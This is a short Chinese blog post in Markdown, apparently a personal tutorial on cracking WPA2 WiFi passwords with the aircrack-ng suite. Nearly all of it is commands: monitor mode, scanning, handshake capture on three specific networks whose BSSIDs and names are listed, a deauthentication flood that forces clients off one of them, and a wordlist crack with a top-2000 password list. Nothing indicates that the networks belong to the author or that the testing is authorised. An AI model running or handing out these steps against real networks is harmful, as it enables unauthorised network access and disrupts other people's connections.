---
title: aircrack使用
published: 2026-04-01
description: wifi暴力破解
pinned: false
tags: [Markdown, Blogging, Mermaid]
category: Examples
draft: false
---
1. 查看wifi信息，获取网卡信息
```
ifconfig
```
获得网卡名字wlx7c3d098082ee
2. 开启网卡监听模式
```
sudo airmon-ng start wlx7c3d098082ee
```
如果不行就杀掉进程先
```
sudo airmon-ng check kill
```
3. 扫描wifi
```
sudo airodump-ng wlx7c3d098082ee
```
记录目标wifi信息
```
DC:FE:18:77:4D:2F  -60       19        0    0  11  405   WPA2 CCMP   PSK  chen
mac地址：DC:FE:18:77:4D:2F，信道：11，名字：chen
```
FC:60:9B:11:F7:97  -56        3        0    0   2  130   WPA2 CCMP   PSK  H
D8:E8:44:E1:DE:92  -68        4        0    0  11  360   WPA2 CCMP   PSK  504
4. 抓包
```
sudo airodump-ng  -c 11  --bssid  DC:FE:18:77:4D:2F -w chen wlx7c3d098082ee
sudo airodump-ng  -c 2  --bssid   FC:60:9B:11:F7:97 -w H wlx7c3d098082ee
sudo airodump-ng  -c 11  --bssid D8:E8:44:E1:DE:92 -w 504 wlx7c3d098082ee
```
5. 新开终端，强制设备重连
```
sudo aireplay-ng --deauth 20 -a D8:E8:44:E1:DE:92 wlx7c3d098082ee
```
6. 验证是否抓到
```
aircrack-ng chen-01.cap
```
7. 破解
```
aircrack-ng -w /home/orangepi/wifi_top2000_passwd.txt chen-01.cap
```